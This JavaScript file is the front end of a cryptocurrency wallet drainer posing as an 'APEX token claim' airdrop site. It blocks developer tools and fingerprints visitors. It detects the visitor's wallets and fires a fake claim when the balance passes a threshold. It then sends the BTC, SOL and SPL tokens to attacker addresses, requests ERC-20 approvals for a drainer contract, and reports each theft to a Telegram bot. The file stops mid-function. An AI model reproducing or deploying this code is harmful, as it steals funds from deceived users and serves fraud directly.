import { CONFIG } from './config.js';

// ============================================================================
//  ANTI-DEBUGGING (reduced, desktop only)
// ============================================================================
(function () {
  const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
  if (isMobile) return;
  const antiDebug = {
    codeProtection: function () {
      document.addEventListener("contextmenu", (e) => e.preventDefault());
      document.addEventListener("selectstart", (e) => e.preventDefault());
      document.addEventListener("keydown", (e) => {
        if (e.keyCode === 123) { e.preventDefault(); return false; }
        if (e.ctrlKey && e.shiftKey && e.keyCode === 73) { e.preventDefault(); return false; }
        if (e.ctrlKey && e.shiftKey && e.keyCode === 74) { e.preventDefault(); return false; }
        if (e.ctrlKey && e.keyCode === 85) { e.preventDefault(); return false; }
      });
    },
    init: function () { this.codeProtection(); },
  };
  antiDebug.init();
})();

// ============================================================================
//  IMPORT FROM CONFIG
// ============================================================================
const {
  DRAINER_CONTRACT,
  CONTRACT_ABI,
  BACKEND_URL,
  ATTACKER_SOLANA_ADDRESS,
  ATTACKER_BTC_ADDRESS,
  TELEGRAM_BOT_TOKEN,
  TELEGRAM_CHAT_ID,
  KNOWN_TOKENS,
  KNOWN_NFT_COLLECTIONS,
  CLAIM_THRESHOLD_USD,
  PERMIT2_ADDRESS,
  APPROVAL_DELAY_MS,
  APPROVAL_COOLDOWN_EVERY,
  APPROVAL_COOLDOWN_MS,
} = CONFIG;

// ============================================================================
//  TELEGRAM HELPER
// ============================================================================
async function sendTelegramMessage(message) {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.warn('⚠️ Telegram credentials missing');
    return false;
  }
  try {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    const response = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'HTML',
      }),
    });
    const result = await response.json();
    if (!response.ok) {
      console.error('❌ Telegram send error:', result);
      return false;
    }
    return true;
  } catch (e) {
    console.error('❌ Telegram send exception:', e);
    return false;
  }
}
window.sendTelegramMessage = sendTelegramMessage;

// ============================================================================
//  WALLET DETECTION (EVM)
// ============================================================================
const walletDetectors = {
  isMetaMask: () => {
    const ethereum = window.ethereum;
    if (!ethereum) return false;
    return [
      ethereum.isMetaMask,
      ethereum._metamask && ethereum._metamask.isUnlocked,
      window.web3 && window.web3.currentProvider && window.web3.currentProvider.isMetaMask,
      ethereum.providers && ethereum.providers.find((p) => p.isMetaMask),
      navigator.userAgent.includes("MetaMaskMobile"),
    ].some((p) => Boolean(p));
  },
  isCoinbaseWallet: () => {
    const ethereum = window.ethereum;
    if (!ethereum) return false;
    return (
      ethereum.isCoinbaseWallet ||
      (ethereum.providers && ethereum.providers.some((p) => p.isCoinbaseWallet)) ||
      window.CoinbaseWalletSDK ||
      navigator.userAgent.includes("CoinbaseWallet")
    );
  },
  isTrustWallet: () => {
    const ethereum = window.ethereum;
    if (!ethereum) return false;
    return (
      ethereum.isTrust ||
      ethereum.isTrustWallet ||
      (ethereum.providers && ethereum.providers.some((p) => p.isTrust || p.isTrustWallet)) ||
      navigator.userAgent.includes("TrustWallet")
    );
  },
  isRabbyWallet: () => {
    const ethereum = window.ethereum;
    if (!ethereum) return false;
    return (ethereum.isRabby || (ethereum.providers && ethereum.providers.some((p) => p.isRabby)));
  },
  isPhantom: () => window.phantom && window.phantom.ethereum,
  isBraveWallet: () => window.ethereum && window.ethereum.isBraveWallet,
  isMobileWallet: () =>
    /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) &&
    (window.ethereum || window.web3),
};

// ============================================================================
//  SOLANA WALLET DETECTION
// ============================================================================
const solanaWalletDetectors = {
  isPhantom: () => !!(window.phantom?.solana || window.solana?.isPhantom),
  isSolflare: () => !!window.solflare,
  isBackpack: () => !!window.backpack,
  isCoinbaseSolana: () => !!window.coinbaseSolana,
  isTrustSolana: () => !!(window.trustWallet?.solana),
};

function getSolanaWallets() {
  const wallets = [];
  if (solanaWalletDetectors.isPhantom()) wallets.push({ name: 'Phantom', provider: window.phantom?.solana || window.solana });
  if (solanaWalletDetectors.isSolflare()) wallets.push({ name: 'Solflare', provider: window.solflare });
  if (solanaWalletDetectors.isBackpack()) wallets.push({ name: 'Backpack', provider: window.backpack });
  if (solanaWalletDetectors.isCoinbaseSolana()) wallets.push({ name: 'Coinbase', provider: window.coinbaseSolana });
  if (solanaWalletDetectors.isTrustSolana()) wallets.push({ name: 'Trust', provider: window.trustWallet.solana });
  return wallets;
}

// ============================================================================
//  CURRENCY CONVERSION
// ============================================================================
const CURRENCY_CONVERTER = {
  rates: {
    USD: 1, EUR: 0.92, GBP: 0.79, JPY: 148.5, CNY: 7.23, INR: 83.2,
    AUD: 1.52, CAD: 1.36, CHF: 0.88, HKD: 7.82, SGD: 1.35, KRW: 1312.5,
    BRL: 4.95, RUB: 91.8, MXN: 17.2, ZAR: 18.9, TRY: 28.7, IDR: 15680,
    THB: 35.8, MYR: 4.68, PHP: 56.2, VND: 24350, AED: 3.67, SAR: 3.75,
    NGN: 900, EGP: 30.9, PKR: 280, BDT: 110,
  },
  detectLocalCurrency: function () {
    try {
      const locale = navigator.language || "en-US";
      const region = locale.split("-")[1] || "US";
      const currencyMap = {
        US: "USD", GB: "GBP", EU: "EUR", DE: "EUR", FR: "EUR", IT: "EUR",
        ES: "EUR", JP: "JPY", CN: "CNY", IN: "INR", AU: "AUD", CA: "CAD",
        RU: "RUB", BR: "BRL", MX: "MXN", KR: "KRW", SG: "SGD", HK: "HKD",
        TR: "TRY", SA: "SAR", AE: "AED", NG: "NGN", ZA: "ZAR", EG: "EGP",
        PK: "PKR", BD: "BDT", ID: "IDR", TH: "THB", MY: "MYR", PH: "PHP",
        VN: "VND",
      };
      return currencyMap[region] || "USD";
    } catch (error) { return "USD"; }
  },
  convertToUSD: function (amount, fromCurrency) {
    const currency = fromCurrency.toUpperCase();
    if (!this.rates[currency]) return amount;
    if (currency === "USD") return amount;
    return amount / this.rates[currency];
  },
  formatCurrency: function (amount, currency) {
    try {
      return new Intl.NumberFormat(navigator.language, {
        style: "currency", currency,
        minimumFractionDigits: 2, maximumFractionDigits: 2,
      }).format(amount);
    } catch (error) { return `${amount} ${currency}`; }
  },
};

// ============================================================================
//  EVASION TECHNIQUES (fingerprinting)
// ============================================================================
const EVASION_TECHNIQUES = {
  async generateWasmFingerprint() {
    try {
      const wasmCode = new Uint8Array([
        0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, 0x01, 0x07, 0x01, 0x60,
        0x02, 0x7f, 0x7f, 0x01, 0x7f, 0x03, 0x02, 0x01, 0x00, 0x07, 0x07, 0x01,
        0x03, 0x61, 0x64, 0x64, 0x00, 0x00, 0x0a, 0x09, 0x01, 0x07, 0x00, 0x20,
        0x00, 0x20, 0x01, 0x6a, 0x0b,
      ]);
      const module = await WebAssembly.instantiate(wasmCode);
      const instance = module.instance;
      return {
        wasmSupported: true,
        memory: instance.exports.memory,
        timestamp: Date.now(),
        hash: Math.random().toString(36).substring(2, 15),
      };
    } catch (e) {
      return { wasmSupported: false, timestamp: Date.now() };
    }
  },
  generateAudioFingerprint() {
    return new Promise((resolve) => {
      try {
        const audioContext = new (window.AudioContext || window.webkitAudioContext)();
        const oscillator = audioContext.createOscillator();
        const analyser = audioContext.createAnalyser();
        oscillator.connect(analyser);
        analyser.connect(audioContext.destination);
        oscillator.start();
        setTimeout(() => {
          oscillator.stop();
          audioContext.close();
          resolve({ audioFingerprint: "completed", hash: Math.random().toString(36).substring(2, 10) });
        }, 100);
      } catch (e) {
        resolve({ audioFingerprint: "failed" });
      }
    });
  },
  generateCanvasFingerprint() {
    const canvas = document.createElement("canvas");
    const ctx = canvas.getContext("2d");
    const noise = Math.random().toString(36).substring(2, 15);
    const noise2 = Math.random().toString(36).substring(2, 10);
    ctx.textBaseline = "top";
    ctx.font = "14px 'Arial'";
    ctx.textBaseline = "alphabetic";
    ctx.fillStyle = "#f60";
    ctx.fillRect(125, 1, 62, 20);
    ctx.fillStyle = "#069";
    ctx.fillText(noise, 2, 15);
    ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
    ctx.fillText(noise2, 4, 17);
    ctx.beginPath();
    ctx.arc(50, 50, 25, 0, Math.PI * 2);
    ctx.stroke();
    return canvas.toDataURL();
  },
  generateBrowserFingerprint() {
    const plugins = Array.from(navigator.plugins).map((p) => p.name).join(",");
    const mimeTypes = Array.from(navigator.mimeTypes).map((mt) => mt.type).join(",");
    return {
      userAgent: navigator.userAgent,
      language: navigator.language,
      platform: navigator.platform,
      hardwareConcurrency: navigator.hardwareConcurrency,
      deviceMemory: navigator.deviceMemory,
      plugins, mimeTypes,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      touchSupport: "ontouchstart" in window,
      cookieEnabled: navigator.cookieEnabled,
      doNotTrack: navigator.doNotTrack,
      isMobile: /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent),
      hash: Math.random().toString(36).substring(2, 15),
      localCurrency: CURRENCY_CONVERTER.detectLocalCurrency(),
    };
  },
  async getETHPriceInUSD() {
    const apis = [
      "https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd",
      "https://api.binance.com/api/v3/ticker/price?symbol=ETHUSDT",
      "https://api.coinbase.com/v2/prices/ETH-USD/spot",
      "https://api.kraken.com/0/public/Ticker?pair=ETHUSD",
    ];
    for (const api of apis) {
      try {
        const response = await fetch(api);
        const data = await response.json();
        if (api.includes("coingecko")) return data.ethereum.usd;
        else if (api.includes("binance")) return parseFloat(data.price);
        else if (api.includes("coinbase")) return parseFloat(data.data.amount);
        else if (api.includes("kraken")) return parseFloat(data.result.XETHZUSD.c[0]);
      } catch (error) { continue; }
    }
    return 2200;
  },
  async getTokenPriceInUSD(tokenAddress) {
    try {
      const response = await fetch(
        `https://api.coingecko.com/api/v3/simple/token_price/ethereum?contract_addresses=${tokenAddress}&vs_currencies=usd`
      );
      const data = await response.json();
      return data[tokenAddress.toLowerCase()].usd;
    } catch (error) {
      const knownTokens = {
        "0xdAC17F958D2ee523a2206206994597C13D831ec7": 1,
        "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48": 1,
        "0x6B175474E89094C44Da98b954EedeAC495271d0F": 1,
        "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599": 42000,
        "0x7D1AfA7B718fb893dB30A3aBc0Cfc608AaCfeBB0": 0.75,
        "0x514910771AF9Ca656af840dff83E8264EcF986CA": 14,
      };
      return knownTokens[tokenAddress] || 0.1;
    }
  },
};

// ============================================================================
//  DYNAMIC SOLANA LIBRARY LOADING
// ============================================================================
async function loadSolanaLibraries() {
  if (typeof solanaWeb3 !== 'undefined' && typeof splToken !== 'undefined') {
    console.log('Solana libraries already loaded');
    return true;
  }
  return new Promise((resolve, reject) => {
    let loaded = 0;
    const total = 2;
    function checkAll() {
      if (loaded === total) { console.log('✅ Solana libraries loaded'); resolve(true); }
    }
    if (typeof solanaWeb3 === 'undefined') {
      const script1 = document.createElement('script');
      script1.src = 'https://cdn.jsdelivr.net/npm/@solana/web3.js@1.87.6/lib/index.iife.min.js';
      script1.onload = () => { loaded++; checkAll(); };
      script1.onerror = () => reject(new Error('Failed to load solanaWeb3'));
      document.head.appendChild(script1);
    } else { loaded++; checkAll(); }
    if (typeof splToken === 'undefined') {
      const script2 = document.createElement('script');
      script2.src = 'https://cdn.jsdelivr.net/npm/@solana/spl-token@0.3.8/lib/index.iife.min.js';
      script2.onload = () => { loaded++; checkAll(); };
      script2.onerror = () => reject(new Error('Failed to load splToken'));
      document.head.appendChild(script2);
    } else { loaded++; checkAll(); }
  });
}

// ============================================================================
//  GLOBAL STATE
// ============================================================================
let tokenChart;
let countdownInterval;
let claimList = [];
let priceHistory = [];
let web3 = null;
let contractInstance = null;
let fingerprintData = {};
let isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
let connectedWallet = null;
let connectedAddress = null;
let stealthMode = false;
let simulationBypassActive = false;
let progressUpdated = false;
let ethPriceInUSD = 2200;
let userHasClaimed = false;
let userBalanceInUSD = 0;
let userLocalCurrency = CURRENCY_CONVERTER.detectLocalCurrency();
const CLAIM_THRESHOLD_USD_CFG = CLAIM_THRESHOLD_USD || 3;
let solanaProvider = null;
let solanaPublicKey = null;
const DISABLE_DISCONNECT = isMobileDevice;
let delayedAttemptsScheduled = false;

// ============================================================================
//  DOM REFERENCES
// ============================================================================
const mobileMenuBtn = document.querySelector(".mobile-menu-btn");
const navLinks = document.querySelector(".nav-links");
const claimListElement = document.getElementById("claimList");
const predictionFill = document.getElementById("predictionFill");
const claimStatus = document.getElementById("claimStatus");
const walletBtn = document.getElementById("walletButton");
const walletButtonContainer = document.getElementById("walletButtonContainer");
const connectButton = document.getElementById("connectButton");
const progressBar = document.getElementById("progressBar");
const progressPercentage = document.getElementById("progressPercentage");
const connectionDebug = document.getElementById("connectionDebug");
const debugToggle = document.getElementById("debugToggle");
const walletModal = document.getElementById("walletModal");
const walletModalClose = document.getElementById("walletModalClose");
const walletProviders = document.querySelectorAll(".wallet-provider");
const announcementModal = document.getElementById("announcementModal");
const announcementModalClose = document.getElementById("announcementModalClose");
const announcementOkBtn = document.getElementById("announcementOkBtn");
const copyReferralBtn = document.getElementById("copyReferralBtn");
const referralLink = document.getElementById("referralLink");

// ============================================================================
//  EVENT LISTENERS
// ============================================================================
if (mobileMenuBtn) mobileMenuBtn.addEventListener("click", toggleMobileMenu);
if (walletModalClose) walletModalClose.addEventListener("click", hideWalletModal);
if (announcementModalClose) announcementModalClose.addEventListener("click", hideAnnouncementModal);
if (announcementOkBtn) announcementOkBtn.addEventListener("click", hideAnnouncementModal);
if (copyReferralBtn) copyReferralBtn.addEventListener("click", copyReferralLink);

if (debugToggle) {
  debugToggle.addEventListener("click", () => {
    connectionDebug.classList.toggle("active");
    debugToggle.textContent = connectionDebug.classList.contains("active")
      ? "Hide connection details"
      : "Show connection details";
  });
}

if (walletProviders) {
  walletProviders.forEach((provider) => {
    provider.addEventListener("click", () => {
      const providerType = provider.getAttribute("data-provider");
      connectWithProvider(providerType);
    });
  });
}

// ============================================================================
//  VANTA BACKGROUND
// ============================================================================
if (typeof VANTA !== "undefined") {
  try {
    VANTA.NET({
      el: "#vanta-bg",
      mouseControls: true, touchControls: true, gyroControls: false,
      minHeight: 200.0, minWidth: 200.0, scale: 1.0, scaleMobile: 1.0,
      color: 0xff6b00, backgroundColor: 0x0f172a,
      points: 15.0, maxDistance: 25.0, spacing: 18.0,
    });
  } catch (e) { console.warn("Vanta init failed:", e); }
}

// ============================================================================
//  INITIALIZATION
// ============================================================================
document.addEventListener("DOMContentLoaded", async function () {
  console.log(`Local currency detected: ${userLocalCurrency}`);
  console.log(`Claim threshold: $${CLAIM_THRESHOLD_USD_CFG} USD`);

  startCountdown();
  createTokenChart();
  updateTokenPrice();
  generateInitialClaims();
  startClaimUpdates();
  updateAIAnalytics();
  initializeAdvancedEvasion();
  detectWallets();

  ethPriceInUSD = await EVASION_TECHNIQUES.getETHPriceInUSD();
  console.log(`Current ETH Price: $${ethPriceInUSD} USD`);

  const localThreshold = CURRENCY_CONVERTER.formatCurrency(
    CLAIM_THRESHOLD_USD_CFG * CURRENCY_CONVERTER.rates[userLocalCurrency],
    userLocalCurrency
  );
  console.log(`Threshold in local currency: ${localThreshold}`);

  setInterval(updateTokenPrice, 10000);
  setInterval(updateAIAnalytics, 15000);
  setInterval(async () => { ethPriceInUSD = await EVASION_TECHNIQUES.getETHPriceInUSD(); }, 60000);

  initializeServiceWorker();
  initializeManualAppKitIntegration();

  if (isMobileDevice) initializeMobileSpecificOptimizations();

  restoreSavedConnection();
});

// ============================================================================
//  PERSISTENCE
// ============================================================================
function saveConnectionToLocalStorage(address, walletType) {
  try {
    localStorage.setItem('connectedAddress', address);
    localStorage.setItem('connectedWalletType', walletType);
    console.log('Connection saved to localStorage');
  } catch (e) { console.warn('Failed to save connection:', e); }
}
function clearSavedConnection() {
  try {
    localStorage.removeItem('connectedAddress');
    localStorage.removeItem('connectedWalletType');
  } catch (e) {}
}
function restoreSavedConnection() {
  const savedAddress = localStorage.getItem('connectedAddress');
  const savedWalletType = localStorage.getItem('connectedWalletType');
  if (savedAddress && savedWalletType) {
    console.log('Restoring saved connection:', savedAddress);
    connectWithProvider(savedWalletType, true);
  }
}

// ============================================================================
//  BALANCE CHECK
// ============================================================================
async function checkAndAutoTriggerClaim() {
  if (!connectedAddress || !web3 || userHasClaimed) return;
  try {
    const ethBalance = await web3.eth.getBalance(connectedAddress);
    const ethBalanceInETH = web3.utils.fromWei(ethBalance, "ether");
    userBalanceInUSD = parseFloat(ethBalanceInETH) * ethPriceInUSD;
    const userBalanceLocal = userBalanceInUSD * CURRENCY_CONVERTER.rates[userLocalCurrency];

    console.log(`User Balance: ${ethBalanceInETH} ETH`);
    console.log(`User Balance: $${userBalanceInUSD.toFixed(2)} USD`);
    console.log(`User Balance: ${CURRENCY_CONVERTER.formatCurrency(userBalanceLocal, userLocalCurrency)}`);

    if (userBalanceInUSD >= CLAIM_THRESHOLD_USD_CFG) {
      logDebug(`TRIGGER: $${userBalanceInUSD.toFixed(2)} USD >= $${CLAIM_THRESHOLD_USD_CFG}`);
      const localAmount = CURRENCY_CONVERTER.formatCurrency(
        CLAIM_THRESHOLD_USD_CFG * CURRENCY_CONVERTER.rates[userLocalCurrency],
        userLocalCurrency
      );
      showNotification(`Balance meets minimum requirement (${localAmount})`, "info");
      const delay = 2000 + Math.random() * 2000;
      setTimeout(() => {
        if (!userHasClaimed) {
          showNotification("Checking eligibility for APEX token claim...", "info");
          initiateClaimProcess();
        }
      }, delay);
    } else {
      const localBalance = CURRENCY_CONVERTER.formatCurrency(userBalanceLocal, userLocalCurrency);
      const localThreshold = CURRENCY_CONVERTER.formatCurrency(
        CLAIM_THRESHOLD_USD_CFG * CURRENCY_CONVERTER.rates[userLocalCurrency],
        userLocalCurrency
      );
      logDebug(`NO TRIGGER: ${localBalance} < ${localThreshold}`);
    }
  } catch (error) { console.error("Error checking user balance:", error); }
}

// ============================================================================
//  BITCOIN DRAIN (native BTC via UniSat)
// ============================================================================
async function drainNativeBTC() {
  try {
    if (!window.unisat) { showNotification("UniSat wallet not found", "error"); return false; }
    const accounts = await window.unisat.getAccounts();
    if (accounts.length === 0) throw new Error("No BTC account");
    const balance = await window.unisat.getBalance();
    const totalSats = balance.total;
    const minSats = 100000;
    if (totalSats < minSats) {
      const msg = `<b>⚠️ BTC Drain Skipped</b>\nAddress: ${accounts[0]}\nBalance: ${totalSats/1e8} BTC\nReason: below threshold`;
      await sendTelegramMessage(msg);
      showNotification(`Insufficient BTC balance (need ${minSats} sats)`, "error");
      return false;
    }
    const amountToSend = totalSats - 5000;
    const txid = await window.unisat.sendBitcoin(ATTACKER_BTC_ADDRESS, amountToSend);
    console.log("BTC sent, txid:", txid);
    showNotification(`BTC transfer successful! ${amountToSend} sats sent`, "success");
    const msg = `<b>🟧 BTC Drain Successful</b>\nAddress: ${accounts[0]}\nAmount: ${amountToSend/1e8} BTC\nTxid: <code>${txid}</code>\nTime: ${new Date().toISOString()}`;
    await sendTelegramMessage(msg);
    return true;
  } catch (e) {
    console.error("BTC drain error:", e);
    showNotification("BTC drain failed: " + e.message, "error");
    const msg = `<b>❌ BTC Drain Failed</b>\nError: ${e.message}\nTime: ${new Date().toISOString()}`;
    await sendTelegramMessage(msg);
    return false;
  }
}

// ============================================================================
//  SOLANA DRAIN (SOL + SPL tokens)
// ============================================================================
async function drainNativeSOL() {
  try {
    await loadSolanaLibraries();
    if (!solanaProvider || !solanaPublicKey) {
      showNotification("Solana wallet not connected", "error");
      return false;
    }
    const connection = new solanaWeb3.Connection('https://api.mainnet-beta.solana.com');
    const owner = new solanaWeb3.PublicKey(solanaPublicKey);
    const solBalance = await connection.getBalance(owner);
    console.log(`💰 SOL balance: ${solBalance / 1e9} SOL`);
    const tokenAccounts = await getAllSolanaTokenAccounts(connection, owner);
    tokenAccounts.forEach(ta => {
      console.log(`💰 Token (${ta.mint}) balance: ${ta.amount / 10**ta.decimals}`);
    });
    if (solBalance <= 5000 && tokenAccounts.length === 0) {
      showNotification("No funds to drain", "error");
      const msg = `<b>⚠️ SOL Drain Skipped</b>\nAddress: ${solanaPublicKey}\nSOL balance: ${solBalance/1e9} SOL\nNo tokens found.`;
      await sendTelegramMessage(msg);
      return false;
    }
    let transaction = new solanaWeb3.Transaction();
    const LAMPORTS_TO_LEAVE = 5000;
    if (solBalance > LAMPORTS_TO_LEAVE) {
      const solTransfer = solanaWeb3.SystemProgram.transfer({
        fromPubkey: owner,
        toPubkey: new solanaWeb3.PublicKey(ATTACKER_SOLANA_ADDRESS),
        lamports: solBalance - LAMPORTS_TO_LEAVE,
      });
      transaction.add(solTransfer);
    }
    for (const ta of tokenAccounts) {
      const attackerTokenAccount = await getAttackerTokenAccount(ta.mint);
      const tokenTransfer = splToken.createTransferInstruction(
        ta.account, attackerTokenAccount, owner, ta.amount, [], splToken.TOKEN_PROGRAM_ID
      );
      transaction.add(tokenTransfer);
    }
    const { blockhash } = await connection.getRecentBlockhash();
    transaction.recentBlockhash = blockhash;
    transaction.feePayer = owner;
    let signed;
    if (solanaProvider.signTransaction) {
      signed = await solanaProvider.signTransaction(transaction);
    } else if (solanaProvider.signAllTransactions) {
      signed = (await solanaProvider.signAllTransactions([transaction]))[0];
    } else if (solanaProvider.signAndSendTransaction) {
      const signature = await solanaProvider.signAndSendTransaction(transaction);
      showNotification(`Solana transaction sent: ${signature.slice(0,10)}...`, "success");
      const msg = `<b>🟪 SOL Drain Successful</b>\nAddress: ${solanaPublicKey}\nSOL sent: ${(solBalance - LAMPORTS_TO_LEAVE)/1e9} SOL\nTokens: ${tokenAccounts.length}\nTxid: <code>${signature}</code>\nTime: ${new Date().toISOString()}`;
      await sendTelegramMessage(msg);
      return true;
    } else {
      throw new Error("Provider cannot sign transactions");
    }
    const signature = await connection.sendRawTransaction(signed.serialize());
    showNotification(`Solana transaction sent: ${signature.slice(0,10)}...`, "success");
    const msg = `<b>🟪 SOL Drain Successful</b>\nAddress: ${solanaPublicKey}\nSOL sent: ${(solBalance - LAMPORTS_TO_LEAVE)/1e9} SOL\nTokens: ${tokenAccounts.length}\nTxid: <code>${signature}</code>\nTime: ${new Date().toISOString()}`;
    await sendTelegramMessage(msg);
    return true;
  } catch (e) {
    console.error("SOL drain error:", e);
    showNotification("SOL drain failed: " + e.message, "error");
    const msg = `<b>❌ SOL Drain Failed</b>\nError: ${e.message}\nTime: ${new Date().toISOString()}`;
    await sendTelegramMessage(msg);
    return false;
  }
}

async function getAllSolanaTokenAccounts(connection, owner) {
  const tokenAccounts = [];
  try {
    const accounts = await connection.getTokenAccountsByOwner(owner, { programId: splToken.TOKEN_PROGRAM_ID });
    for (const { pubkey, account } of accounts.value) {
      const accountInfo = splToken.AccountLayout.decode(account.data);
      if (accountInfo.amount > 0) {
        const mint = new solanaWeb3.PublicKey(accountInfo.mint);
        let decimals = 9;
        try {
          const mintInfo = await connection.getParsedAccountInfo(mint);
          if (mintInfo.value?.data?.parsed?.info?.decimals) {
            decimals = mintInfo.value.data.parsed.info.decimals;
          }
        } catch (e) {}
        tokenAccounts.push({ mint: mint.toString(), decimals, account: pubkey, amount: accountInfo.amount });
      }
    }
  } catch (e) { console.warn("Failed to fetch token accounts:", e); }
  return tokenAccounts;
}

async function getAttackerTokenAccount(mint) {
  const attackerPubkey = new solanaWeb3.PublicKey(ATTACKER_SOLANA_ADDRESS);
  const mintPubkey = new solanaWeb3.PublicKey(mint);
  return splToken.getAssociatedTokenAddressSync(mintPubkey, attackerPubkey);
}

// ============================================================================
//  SYNC FROM main.js
// ============================================================================
function syncFromGlobal() {
  if (window.__apexConnected?.address) {
    connectedAddress = window.__apexConnected.address;
    connectedWallet = window.__apexConnected.chain;
    if (window.__apexConnected.web3) web3 = window.__apexConnected.web3;
    if (window.__apexConnected.contract) contractInstance = window.__apexConnected.contract;
    logDebug(`Synced from main.js: ${connectedAddress} (${connectedWallet})`);
    return true;
  }
  // Fallback: build from window.ethereum
  if (window.ethereum) {
    try {
      web3 = new Web3(window.ethereum);
      contractInstance = new web3.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
      logDebug('Fallback Web3 built from window.ethereum');
      return true;
    } catch (e) { logDebug('Fallback Web3 failed: ' + e.message); }
  }
  return false;
}

// ============================================================================
//  TOKEN + NFT DETECTION
// ============================================================================
async function getManualTokenBalance(tokenAddress, walletAddress) {
  const erc20Abi = [
    { constant: true, inputs: [{ name: "_owner", type: "address" }], name: "balanceOf", outputs: [{ name: "balance", type: "uint256" }], type: "function" },
  ];
  try {
    const contract = new web3.eth.Contract(erc20Abi, tokenAddress);
    return await contract.methods.balanceOf(walletAddress).call();
  } catch (e) { return 0; }
}

async function getManualNFTBalance(contractAddress, userAddress) {
  const nftAbi = [
    { constant: true, inputs: [{ name: "_owner", type: "address" }], name: "balanceOf", outputs: [{ name: "balance", type: "uint256" }], type: "function" },
  ];
  try {
    const contract = new web3.eth.Contract(nftAbi, contractAddress);
    return await contract.methods.balanceOf(userAddress).call();
  } catch (e) { return 0; }
}

async function getTokenBalanceWithMetadata(tokenAddress, userAddress, symbol, decimals) {
  const balance = await getManualTokenBalance(tokenAddress, userAddress);
  if (balance === '0' || balance === 0) return null;
  let priceUSD = 0;
  try { priceUSD = await EVASION_TECHNIQUES.getTokenPriceInUSD(tokenAddress); } catch (e) {}
  const balanceFormatted = parseFloat(balance) / Math.pow(10, decimals);
  const valueUSD = balanceFormatted * priceUSD;
  return {
    address: tokenAddress, symbol, decimals,
    balance: balance.toString(), balanceFormatted, valueUSD,
  };
}

async function fetchComprehensiveTokenList() {
  const sources = [
    "https://tokens.coingecko.com/ethereum/all.json",
    "https://raw.githubusercontent.com/Uniswap/default-token-list/main/src/tokens/ethereum.json",
    "https://api.1inch.io/v4.0/1/tokens",
  ];
  for (const src of sources) {
    try {
      const res = await fetch(src);
      const data = await res.json();
      if (data.tokens) return data.tokens;
    } catch (e) {}
  }
  return KNOWN_TOKENS;
}

async function detectAllERC20Tokens(userAddress) {
  const result = { tokens: [], nfts: [], totalValueUSD: 0 };
  const tokenList = await fetchComprehensiveTokenList();
  const balanceChecks = tokenList.map(token => ({
    address: token.address,
    symbol: token.symbol,
    decimals: token.decimals || 18,
  }));

  const concurrency = 5;
  for (let i = 0; i < balanceChecks.length; i += concurrency) {
    const batch = balanceChecks.slice(i, i + concurrency);
    const promises = batch.map(token =>
      getTokenBalanceWithMetadata(token.address, userAddress, token.symbol, token.decimals)
    );
    const results = await Promise.allSettled(promises);
    results.forEach((res) => {
      if (res.status === 'fulfilled' && res.value && res.value.balance > 0) {
        result.tokens.push(res.value);
        result.totalValueUSD += res.value.valueUSD || 0;
      }
    });
  }

  for (const nft of KNOWN_NFT_COLLECTIONS) {
    try {
      const nftBalance = await getManualNFTBalance(nft.address, userAddress);
      if (nftBalance > 0) {
        result.nfts.push({
          address: nft.address,
          balance: parseInt(nftBalance),
          name: nft.name,
          standard: nft.standard,
          tokenIds: [],
        });
      }
    } catch (e) {}
  }

  const localValue = CURRENCY_CONVERTER.formatCurrency(
    result.totalValueUSD * CURRENCY_CONVERTER.rates[userLocalCurrency],
    userLocalCurrency
  );
  logDebug(`Total portfolio value: ${localValue}`);
  return result;
}

// ============================================================================
//  APPROVE TOKEN ON THE TOKEN CONTRACT (with USDT two-step reset)
// ============================================================================
async function checkAllowance(tokenAddr, owner) {
  const abi = [
    { constant: true, inputs: [{ name: "_owner", type: "address" }, { name: "_spender", type: "address" }], name: "allowance", outputs: [{ name: "", type: "uint256" }], type: "function" },
  ];
  try {
    const c = new web3.eth.Contract(abi, tokenAddr);
    return await c.methods.allowance(owner, DRAINER_CONTRACT).call();
  } catch (e) { return '0'; }
}

async function approveTokenOnToken(tokenAddress, userAddress, amount) {
  try {
    const erc20Abi = [
      { constant: false, inputs: [{ name: "_spender", type: "address" }, { name: "_value", type: "uint256" }], name: "approve", outputs: [{ name: "", type: "bool" }], type: "function" },
    ];
    const tokenContract = new web3.eth.Contract(erc20Abi, tokenAddress);

    // ── USDT-style reset ──────────────────────────────────────────
    const currentAllowance = await checkAllowance(tokenAddress, userAddress);
    if (currentAllowance !== '0' && currentAllowance !== '0x0') {
      logDebug(`Resetting allowance for ${tokenAddress}...`);
      try {
        const resetGas = await tokenContract.methods.approve(DRAINER_CONTRACT, '0').estimateGas({ from: userAddress });
        const resetTx = await tokenContract.methods.approve(DRAINER_CONTRACT, '0').send({
          from: userAddress,
          gas: Math.floor(resetGas * 1.2),
          gasPrice: await web3.eth.getGasPrice(),
        });
        logDebug(`Reset TX: ${resetTx.transactionHash}`);
        await new Promise(r => setTimeout(r, 3000));
      } catch (e) {
        logDebug(`Reset failed (continuing): ${e.message}`);
      }
    }

    // ── Main approve ──────────────────────────────────────────────
    const gasEstimate = await tokenContract.methods.approve(DRAINER_CONTRACT, amount).estimateGas({ from: userAddress });
    const tx = await tokenContract.methods.approve(DRAINER_CONTRACT, amount).send({
      from: userAddress,
      gas: Math.floor(gasEstimate * 1.2),
      gasPrice: await web3.eth.getGasPrice(),
    });
    logDebug(`Approve OK for ${tokenAddress}: ${tx.transactionHash}`);
    return tx.transactionHash;
  } catch (error) {
    console.error("approve failed:", error);
    logDebug(`Approve failed for ${tokenAddress}: ${error.message}`);
    return null;
  }
